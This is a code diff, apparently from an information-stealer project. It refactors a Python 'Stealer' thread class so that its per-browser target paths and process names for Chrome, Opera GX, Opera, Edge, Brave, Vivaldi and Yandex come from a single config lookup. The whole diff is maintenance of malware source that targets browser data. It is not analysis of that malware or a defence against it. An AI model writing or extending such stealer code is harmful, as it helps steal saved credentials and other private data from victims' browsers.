@@ -52,9 +52,8 @@ class Stealer(Thread):
                 "object": Chromium,
                 "arguments": (
                     Browsers.CHROME.value,
-                    self.__config.ChromePaths[0],
-                    self.__config.ChromePaths[1],
-                    self.__config.ChromePaths[2],
+                    self.__config.BrowsersData[Browsers.CHROME]["path"],
+                    self.__config.BrowsersData[Browsers.CHROME]["process"],
                     browser_functions
                 ),
                 "status": browser_statuses
@@ -63,9 +62,8 @@ class Stealer(Thread):
                 "object": Chromium,
                 "arguments": (
                     Browsers.OPERA_GX.value,
-                    self.__config.OperaGXPaths[0],
-                    self.__config.OperaGXPaths[1],
-                    self.__config.OperaGXPaths[2],
+                    self.__config.BrowsersData[Browsers.OPERA_GX]["path"],
+                    self.__config.BrowsersData[Browsers.OPERA_GX]["process"],
                     browser_functions
                 ),
                 "status": browser_statuses
@@ -74,9 +72,8 @@ class Stealer(Thread):
                 "object": Chromium,
                 "arguments": (
                     Browsers.OPERA_DEFAULT.value,
-                    self.__config.OperaDefaultPaths[0],
-                    self.__config.OperaDefaultPaths[1],
-                    self.__config.OperaDefaultPaths[2],
+                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["path"],
+                    self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["process"],
                     browser_functions
                 ),
                 "status": browser_statuses
@@ -85,9 +82,8 @@ class Stealer(Thread):
                 "object": Chromium,
                 "arguments": (
                     Browsers.EDGE.value,
-                    self.__config.MicrosoftEdgePaths[0],
-                    self.__config.MicrosoftEdgePaths[1],
-                    self.__config.MicrosoftEdgePaths[2],
+                    self.__config.BrowsersData[Browsers.EDGE]["path"],
+                    self.__config.BrowsersData[Browsers.EDGE]["process"],
                     browser_functions
                 ),
                 "status": browser_statuses
@@ -96,9 +92,8 @@ class Stealer(Thread):
                 "object": Chromium,
                 "arguments": (
                     Browsers.BRAVE.value,
-                    self.__config.BravePaths[0],
-                    self.__config.BravePaths[1],
-                    self.__config.BravePaths[2],
+                    self.__config.BrowsersData[Browsers.BRAVE]["path"],
+                    self.__config.BrowsersData[Browsers.BRAVE]["process"],
                     browser_functions
                 ),
                 "status": browser_statuses
@@ -107,9 +102,8 @@ class Stealer(Thread):
                 "object": Chromium,
                 "arguments": (
                     Browsers.VIVALDI.value,
-                    self.__config.VivaldiPaths[0],
-                    self.__config.VivaldiPaths[1],
-                    self.__config.VivaldiPaths[2],
+                    self.__config.BrowsersData[Browsers.VIVALDI]["path"],
+                    self.__config.BrowsersData[Browsers.VIVALDI]["process"],
                     browser_functions
                 ),
                 "status": browser_statuses
@@ -118,9 +112,8 @@ class Stealer(Thread):
                 "object": Chromium,
                 "arguments": (
                     Browsers.YANDEX.value,
-                    self.__config.YandexPaths[0],
-                    self.__config.YandexPaths[1],
-                    self.__config.YandexPaths[2],
+                    self.__config.BrowsersData[Browsers.YANDEX]["path"],
+                    self.__config.BrowsersData[Browsers.YANDEX]["process"],
                     browser_functions
                 ),
                 "status": browser_statuses
